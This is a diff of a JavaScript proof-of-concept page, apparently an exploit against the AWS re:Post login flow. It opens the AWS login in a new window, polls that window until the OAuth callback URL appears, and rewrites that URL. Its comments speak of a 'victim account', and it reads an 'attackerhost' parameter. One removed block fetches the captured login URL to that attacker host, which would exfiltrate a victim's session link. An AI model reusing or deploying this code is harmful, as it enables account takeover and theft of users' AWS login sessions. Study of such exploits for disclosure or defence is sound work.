@@ -1,9 +1,7 @@
-// Full list of AWS regions and their latitudes/longitudes
 const awsRegions = [
     { name: "us-west-2", lat: 45.5152, lon: -122.6784 },   // Oregon
     { name: "ap-southeast-1", lat: 1.3521, lon: 103.8198 },// Singapore
     { name: "eu-central-1", lat: 50.1109, lon: 8.6821 },   // Frankfurt
-    // Add more regions as needed
 ];
 
 // Haversine formula to calculate distance between two geographic coordinates
@@ -535,7 +533,6 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
     // Open the URL in a new window
     let newWindow = window.open('https://repost.aws/api/v1/identity/aws/login?redirectUrl=https%3A%2F%2Frepost.aws%2Fauth', '_blank');
 
-    // Ensure the current window remains focused
     // Poll the window every 100 milliseconds to check for URL change
     const checkUrlInterval = setInterval(() => {
         try {
@@ -563,21 +560,7 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
         }
     }, 100); // Check every 100 milliseconds
 
-    
-    //let newWindow = window.open("https://eu-central-1.console.aws.amazon.com/cke/auth?region=eu-central-1&redirectUrl=https%3A%2Frepost.aws%2Fapi%2Fv1%2Fidentity%2Faws%2Fcallback%3Fstate%3DeyJub25jZSI6ImdkYmQ5aUxqUUdPM0RseUVEdmRDMUEifQ&challenge=V9Yz1LWbNnjk2PJZaxgoN8PN3tXhppD0Vk2hOg5huhU", "_blank");
-    // let n = 10; // Set initial countdown value
-    // const paragraph = document.getElementById("vic-url");
-    // const countdown = setInterval(function() {
-    //     paragraph.innerHTML = `<strong>You will be redirected after ${n} second${n === 1 ? '' : 's'}<strong><br/>`;
-    //     n--;
 
-    //     if (n < 0) {
-    //         clearInterval(countdown); // Stop the countdown when n reaches 0
-    //         var host = window.location.protocol + "//" + window.location.host;
-    //         window.location.href = host;
-    //         // Add any redirect or action here
-    //     }
-    // }, 1300); // Update every 1 second (1000 milliseconds)
 
     if (newWindow) {
         const checkUrlInterval = setInterval(() => {
@@ -587,12 +570,10 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
         
             // Check if the URL contains the string we want to replace
             if (currentUrl.includes('/repost.aws/api/v1/identity/aws/callback')) {
-                // Replace "https%3A%2F%2Frepost.aws" with "https%3A%2Frepost.aws"
                 try {
                     let url = newWindow.location.href;
                     let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
     
-                    //alert("Login URL to the victim account: " + modifiedUrl);
                     // 1. Extract the parameter value from the URL
                     function getParameterByName(name) {
                         const url = window.location.href;
@@ -643,50 +624,6 @@ document.getElementById('openWindowBtn').addEventListener('click', function() {
             console.log('Error accessing window URL. Possibly cross-origin.');
             }
         }, 100); // Check every 100 milliseconds
-        // setTimeout(function () {
-        //     try {
-        //         let url = newWindow.location.href;
-        //         let modifiedUrl = url.replace(/https:\/\/.*\.console\.aws\.amazon\.com\//, 'https://');
-
-        //         //alert("Login URL to the victim account: " + modifiedUrl);
-        //         // 1. Extract the parameter value from the URL
-        //         function getParameterByName(name) {
-        //             const url = window.location.href;
-        //             name = name.replace(/[\[\]]/g, '\\$&'); // Escape brackets if present in the parameter name
-        //             const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
-        //             const results = regex.exec(url);
-        //             if (!results) return null;
-        //             if (!results[2]) return '';
-        //             return decodeURIComponent(results[2].replace(/\+/g, ' '));
-        //         }
-
-        //         // Get the 'attackerhost' parameter value
-        //         const attackerHost = getParameterByName('attackerhost');
-
-        //         // 2. Send GET request to the attackerHost if the parameter exists
-        //         if (attackerHost) {
-        //             fetch(`https://${attackerHost}/login_url=${modifiedUrl}`)
-        //                 .then(response => {
-        //                     if (!response.ok) {
-        //                         throw new Error('Network response was not ok');
-        //                     }
-        //                     return response.text();
-        //                 })
-        //                 .then(data => {
-        //                     console.log('Response from attacker host:', data);
-        //                 })
-        //                 .catch(error => {
-        //                     console.error('Error fetching from attacker host:', error);
-        //                 });
-        //         } else {
-        //             console.log('No attackerhost parameter found in URL');
-        //         }
-
-        //     } catch (e) {
-        //         alert("Unable to access the URL of the new window due to security restrictions.");
-        //     }
-
-        // }, 12000); // 12000 milliseconds = 12 seconds
     } else {
         alert("Nothing");
     }
